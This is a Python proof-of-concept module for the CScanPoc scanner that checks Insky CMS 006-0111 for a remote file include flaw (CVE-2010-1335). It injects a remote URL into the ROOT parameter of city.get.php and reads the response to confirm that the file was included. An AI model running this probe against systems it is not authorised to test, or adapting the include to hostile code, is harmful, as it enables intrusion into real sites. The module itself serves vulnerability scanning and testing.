# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = 'b6a55c63-59b9-488f-ad49-99d2c6cbb657'
    name = 'Insky CMS 006-0111 - Multiple Remote File Include Vulnerability' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2010-04-09'  # 漏洞公布时间
    desc = '''
        Insky CMS 006-0111 存在远程文件包含漏洞。
    ''' # 漏洞描述
    ref = 'http://www.sebug.net/vuldb/ssvid-68005' # 
    cnvd_id = 'CNVD-2006-5445' # cnvd漏洞编号
    cve_id = 'CVE-2010-1335'  # cve编号
    product = 'Insky CMS'  # 漏洞组件名称
    product_version = '006-0111'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b28c9311-fb65-4d7c-9c4b-76b3fa64fc32' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/modules/city.get/city.get.php?ROOT=http://baidu.com/robots.txt'
            response = requests.get(vul_url).content
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()